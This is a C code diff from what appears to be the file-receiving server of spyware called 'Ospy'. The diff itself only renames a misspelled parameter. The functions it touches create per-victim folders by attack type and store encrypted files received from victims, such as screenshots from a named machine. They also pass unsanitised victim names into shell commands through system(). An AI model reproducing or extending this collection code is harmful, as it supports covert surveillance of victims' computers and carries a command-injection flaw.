@@ -73,13 +73,13 @@ void bace64_to_original_convertor (char * path_to_decoded_file){
 	system(commend);
 }
 
-void crate_folders (char * victim_name, char * attacket_type){
+void crate_folders (char * victim_name, char * attack_type){
 	char create_folders[CREATE_FOLDER_CMD_LEN];
-	sprintf(create_folders, "mkdir -p Ospy/%s/%s", victim_name, attacket_type);
+	sprintf(create_folders, "mkdir -p Ospy/%s/%s", victim_name, attack_type);
 	system(create_folders);
 }
 
-FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attacket_type){	
+FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attack_type){	
 	FILE * encrypted_receved_file;
 	file_transformation_protocol cour_file_buffer;
 	int sub_buffer_size = 0;
@@ -95,11 +95,11 @@ FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * fi
 		exit(1);
 	}
 	
-	crate_folders(victim_name, attacket_type);
+	crate_folders(victim_name, attack_type);
 	
 	// exempal of "file_path" : Ospy/ori_mac_mini/screenshots/screenshot_TueDec1117/24/012018
 	char file_path[MAX_USER_NAME_LEN + 100];
-	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s",victim_name, attacket_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
+	sprintf(file_path,"Ospy/%s/%s/%s_%d_%02d_%02d:%02d:%02d%s",victim_name, attack_type, file_name, (ptm->tm_year+1900), (ptm->tm_mon + 1), ptm->tm_hour, ptm->tm_min, ptm->tm_sec, file_extension);
 		
 	encrypted_receved_file = fopen(ENCRYPTED_RECEIVED_FILE_NAME, "w");
 	
